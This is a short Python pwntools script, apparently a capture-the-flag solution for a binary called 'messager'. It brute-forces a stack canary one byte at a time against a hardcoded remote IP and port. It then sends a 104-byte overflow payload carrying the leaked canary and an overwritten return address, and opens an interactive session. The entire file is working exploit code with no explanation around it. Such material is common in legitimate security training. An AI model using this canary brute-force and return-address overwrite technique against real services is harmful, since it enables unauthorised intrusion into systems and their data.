from pwn import *

#server = process('./messager')
debug = 0

leak_canary = '\0'
for i in range(7):
	for c in range(256): 
		try:
			if debug:
				client = remote('127.0.0.1', 5555)
			else:
				client = remote('218.2.197.234', 2090)
			payload = 'a'*104 + leak_canary
			payload += chr(c)
			client.send(payload)
			data = client.recvuntil('Message received!')
			print 'right'
			leak_canary += chr(c)
			break
		except EOFError as e:
			client.close()
	print i
	print leak_canary.encode('hex')


if debug:
	client = remote('127.0.0.1', 5555)
else:
	client = remote('218.2.197.234', 2090)
payload = 'a'*104 + leak_canary + p64(0x400BC6) + p64(0x400BC6)
client.send(payload)

client.interactive()
